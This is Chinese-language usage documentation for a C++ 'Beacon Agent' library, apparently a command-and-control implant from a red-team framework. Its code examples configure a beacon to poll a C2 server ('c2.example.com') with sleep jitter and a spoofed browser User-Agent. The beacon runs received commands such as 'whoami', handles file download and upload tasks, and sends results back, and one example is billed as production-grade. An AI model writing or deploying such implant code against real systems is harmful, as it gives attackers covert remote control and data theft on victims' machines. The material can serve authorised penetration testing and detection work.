# 使用示例

本文档提供了Beacon Agent的各种使用示例。

## 基础示例

### 1. 创建和启动一个简单的Beacon

```cpp
#include "adaptix/beacon/beacon.h"
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/command_executor.h"
#include "adaptix/beacon/http_transport.h"

int main() {
  using namespace adaptix::beacon;

  // 创建配置
  auto config = std::make_shared<BeaconConfig>();
  config->set_server_address("192.168.1.100");
  config->set_server_port(8443);
  config->set_sleep_interval(std::chrono::seconds(10));
  config->set_jitter_percent(30);
  
  // 创建传输层和执行器
  auto transport = std::make_unique<HttpTransport>(config);
  auto executor = std::make_unique<DefaultCommandExecutor>();
  
  // 创建并启动beacon
  Beacon beacon(config, std::move(transport), std::move(executor));
  beacon.Start();
  
  // Beacon在后台运行...
  std::this_thread::sleep_for(std::chrono::minutes(5));
  
  // 停止beacon
  beacon.Stop();
  
  return 0;
}
```

## 高级配置示例

### 2. 使用HTTPS和自定义User Agent

```cpp
auto config = std::make_shared<BeaconConfig>();
config->set_server_address("c2.example.com");
config->set_server_port(443);
config->set_protocol(TransportProtocol::kHttps);
config->set_encryption(EncryptionType::kAes256);
config->set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
config->set_beacon_id("agent-12345");
config->set_max_retries(5);
```

### 3. 配置睡眠间隔和抖动

```cpp
// 基础睡眠间隔为5秒
config->set_sleep_interval(std::chrono::seconds(5));

// 30%的抖动 - 实际睡眠时间在5秒到6.5秒之间随机
config->set_jitter_percent(30);

// 长睡眠间隔 - 10分钟
config->set_sleep_interval(std::chrono::minutes(10));

// 高抖动 - 50%抖动
config->set_jitter_percent(50);
```

## 任务处理示例

### 4. 创建和执行任务

```cpp
#include "adaptix/beacon/task.h"
#include "adaptix/beacon/command_executor.h"

// 创建一个命令任务
Task command_task("task-001", TaskType::kCommand, "ls -la /tmp");

// 创建执行器
DefaultCommandExecutor executor;

// 执行任务
TaskResult result = executor.Execute(command_task);

// 检查结果
if (result.status() == TaskStatus::kCompleted) {
  std::cout << "输出: " << result.output() << std::endl;
} else if (result.status() == TaskStatus::kFailed) {
  if (result.error_message().has_value()) {
    std::cerr << "错误: " << result.error_message().value() << std::endl;
  }
}
```

### 5. 不同类型的任务

```cpp
// 命令任务
Task cmd_task("001", TaskType::kCommand, "whoami");

// 脚本任务
Task script_task("002", TaskType::kScript, "echo 'Hello from script'");

// 文件下载任务（需要自定义实现）
Task download_task("003", TaskType::kFileDownload, "/path/to/file");

// 文件上传任务（需要自定义实现）
Task upload_task("004", TaskType::kFileUpload, "/path/to/destination");

// 休眠任务
Task sleep_task("005", TaskType::kSleep, "60");
```

## 自定义传输层示例

### 6. 实现自定义传输协议

```cpp
#include "adaptix/beacon/transport.h"

class TcpTransport : public Transport {
 public:
  explicit TcpTransport(std::shared_ptr<BeaconConfig> config) 
      : config_(std::move(config)) {}
  
  std::optional<Task> ReceiveTask() override {
    // 通过TCP连接接收任务
    // 实现你的TCP客户端逻辑
    return std::nullopt;
  }
  
  bool SendResult(const TaskResult& result) override {
    // 通过TCP发送结果
    // 实现你的TCP客户端逻辑
    return true;
  }
  
 private:
  std::shared_ptr<BeaconConfig> config_;
};

// 使用自定义传输
auto transport = std::make_unique<TcpTransport>(config);
Beacon beacon(config, std::move(transport), executor);
```

## 自定义命令执行器示例

### 7. 扩展命令执行器

```cpp
#include "adaptix/beacon/command_executor.h"

class CustomCommandExecutor : public CommandExecutor {
 public:
  TaskResult Execute(const Task& task) override {
    switch (task.type()) {
      case TaskType::kCommand:
        return ExecuteCommandTask(task);
      
      case TaskType::kScript:
        return ExecuteScriptTask(task, "python3");  // 使用Python
      
      case TaskType::kFileDownload:
        return DownloadFile(task);
      
      default:
        TaskResult result(task.id(), TaskStatus::kFailed, "");
        result.set_error_message("Unsupported task type");
        return result;
    }
  }
  
 private:
  TaskResult DownloadFile(const Task& task) {
    // 实现文件下载逻辑
    // 使用libcurl或其他HTTP库
    return TaskResult(task.id(), TaskStatus::kCompleted, "File downloaded");
  }
};
```

## 错误处理示例

### 8. 配置验证和错误处理

```cpp
auto config = std::make_shared<BeaconConfig>();
config->set_server_address("c2.example.com");
config->set_server_port(8080);

// 验证配置
if (!config->Validate()) {
  std::cerr << "配置无效！" << std::endl;
  return 1;
}

// 创建beacon
Beacon beacon(config, std::move(transport), std::move(executor));

// Start会在配置无效时自动返回
beacon.Start();

// 检查beacon是否运行
if (beacon.is_running()) {
  std::cout << "Beacon正在运行" << std::endl;
} else {
  std::cerr << "Beacon启动失败" << std::endl;
}
```

### 9. 任务执行错误处理

```cpp
TaskResult result = executor.Execute(task);

switch (result.status()) {
  case TaskStatus::kCompleted:
    std::cout << "任务成功: " << result.output() << std::endl;
    break;
  
  case TaskStatus::kFailed:
    std::cerr << "任务失败";
    if (result.error_message().has_value()) {
      std::cerr << ": " << result.error_message().value();
    }
    std::cerr << std::endl;
    break;
  
  case TaskStatus::kPending:
    std::cout << "任务等待中..." << std::endl;
    break;
  
  case TaskStatus::kRunning:
    std::cout << "任务执行中..." << std::endl;
    break;
}
```

## 线程安全示例

### 10. 安全的启动和停止

```cpp
#include <signal.h>

std::unique_ptr<Beacon> global_beacon;

void signal_handler(int signal) {
  if (signal == SIGINT || signal == SIGTERM) {
    std::cout << "\n正在停止beacon..." << std::endl;
    if (global_beacon) {
      global_beacon->Stop();
    }
    exit(0);
  }
}

int main() {
  // 注册信号处理器
  signal(SIGINT, signal_handler);
  signal(SIGTERM, signal_handler);
  
  // 创建beacon
  auto config = std::make_shared<BeaconConfig>();
  // ... 配置设置 ...
  
  global_beacon = std::make_unique<Beacon>(
      config,
      std::make_unique<HttpTransport>(config),
      std::make_unique<DefaultCommandExecutor>()
  );
  
  global_beacon->Start();
  
  // 保持主线程运行
  while (global_beacon->is_running()) {
    std::this_thread::sleep_for(std::chrono::seconds(1));
  }
  
  return 0;
}
```

## 测试示例

### 11. 单元测试骨架

```cpp
#include <cassert>
#include "adaptix/beacon/beacon_config.h"

void test_beacon_config() {
  BeaconConfig config;
  
  // 测试默认值
  assert(config.server_address() == "localhost");
  assert(config.server_port() == 8080);
  
  // 测试设置
  config.set_server_address("test.com");
  assert(config.server_address() == "test.com");
  
  // 测试验证
  assert(config.Validate() == true);
  
  // 测试无效配置
  config.set_server_port(0);
  assert(config.Validate() == false);
  
  std::cout << "BeaconConfig测试通过！" << std::endl;
}

int main() {
  test_beacon_config();
  return 0;
}
```

## 集成示例

### 12. 完整的生产级示例

```cpp
#include <csignal>
#include <fstream>
#include <iostream>
#include <memory>

#include "adaptix/beacon/beacon.h"
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/command_executor.h"
#include "adaptix/beacon/http_transport.h"

class ProductionBeacon {
 public:
  ProductionBeacon() = default;
  
  bool LoadConfig(const std::string& config_file) {
    // TODO: 从JSON/YAML文件加载配置
    config_ = std::make_shared<adaptix::beacon::BeaconConfig>();
    config_->set_server_address("c2.example.com");
    config_->set_server_port(443);
    config_->set_protocol(adaptix::beacon::TransportProtocol::kHttps);
    config_->set_sleep_interval(std::chrono::minutes(1));
    config_->set_jitter_percent(20);
    return config_->Validate();
  }
  
  void Run() {
    using namespace adaptix::beacon;
    
    auto transport = std::make_unique<HttpTransport>(config_);
    auto executor = std::make_unique<DefaultCommandExecutor>();
    
    beacon_ = std::make_unique<Beacon>(
        config_,
        std::move(transport),
        std::move(executor)
    );
    
    beacon_->Start();
    
    // 等待停止信号
    while (beacon_->is_running() && !stop_requested_) {
      std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    beacon_->Stop();
  }
  
  void RequestStop() {
    stop_requested_ = true;
  }
  
 private:
  std::shared_ptr<adaptix::beacon::BeaconConfig> config_;
  std::unique_ptr<adaptix::beacon::Beacon> beacon_;
  std::atomic<bool> stop_requested_{false};
};

static ProductionBeacon* g_beacon = nullptr;

void signal_handler(int signal) {
  if (signal == SIGINT || signal == SIGTERM) {
    if (g_beacon) {
      g_beacon->RequestStop();
    }
  }
}

int main(int argc, char* argv[]) {
  std::string config_file = "beacon_config.json";
  if (argc > 1) {
    config_file = argv[1];
  }
  
  ProductionBeacon beacon;
  g_beacon = &beacon;
  
  // 设置信号处理
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);
  
  // 加载配置
  if (!beacon.LoadConfig(config_file)) {
    std::cerr << "加载配置失败: " << config_file << std::endl;
    return 1;
  }
  
  std::cout << "Beacon启动中..." << std::endl;
  beacon.Run();
  std::cout << "Beacon已停止" << std::endl;
  
  return 0;
}
```

## 编译和运行

### 编译单个示例

```bash
# 编译基础示例
g++ -std=c++17 -I../include example1.cc -L../build -ladaptix_beacon -lpthread -o example1

# 运行
./example1
```

### 使用CMake编译

在项目的CMakeLists.txt中添加示例：

```cmake
add_executable(example1 examples/example1.cc)
target_link_libraries(example1 PRIVATE adaptix_beacon)
```

## 注意事项

1. **生产环境**：这些示例用于演示，生产环境需要添加：
   - 实际的HTTP/HTTPS通信实现
   - 加密和认证
   - 错误恢复和重试逻辑
   - 完整的日志记录
   - 配置文件支持

2. **安全性**：
   - 永远不要在代码中硬编码凭证
   - 使用环境变量或安全的配置文件
   - 验证所有输入
   - 使用加密传输

3. **资源管理**：
   - 使用RAII确保资源清理
   - 注意线程的正确停止
   - 避免资源泄漏

4. **错误处理**：
   - 总是检查返回值
   - 使用std::optional处理可能失败的操作
   - 提供有用的错误消息
